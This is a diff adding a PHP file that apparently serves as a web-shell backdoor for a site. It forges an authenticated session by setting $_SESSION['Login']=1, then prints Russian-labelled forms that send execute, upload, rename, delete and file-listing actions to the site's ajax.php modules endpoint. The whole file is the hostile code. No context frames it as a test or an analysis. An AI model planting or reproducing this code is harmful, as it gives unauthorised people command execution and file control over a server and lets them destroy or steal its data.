@@ -1,0 +1,8 @@
+<?php
+session_start();
+echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="execute"><textarea name="qry" rows=5 cols=80></textarea><input type="submit" value="Выполнить"></form>';
+echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post" enctype="multipart/form-data"><input type="hidden" name="action" value="upload"><input type="hidden" name="MAX_FILE_SIZE" value="1000000"><input type="text" name="target_folder"><br><input type="file" name="file"><input type="submit" value="Загрузить"></form>';
+echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="rename"><input type="text" name="old_file"><br><input type="text" name="new_file"><input type="submit" value="Переименовать"></form>';
+echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="delete"><input type="text" name="target_file"><input type="submit" value="Удалить"></form>';
+echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="getfiles"><input type="text" name="target_folder"><input type="submit" value="Список файлов"></form>';$_SESSION['Login']=1; $_SESSION['DocumentId'] =2;
+?>
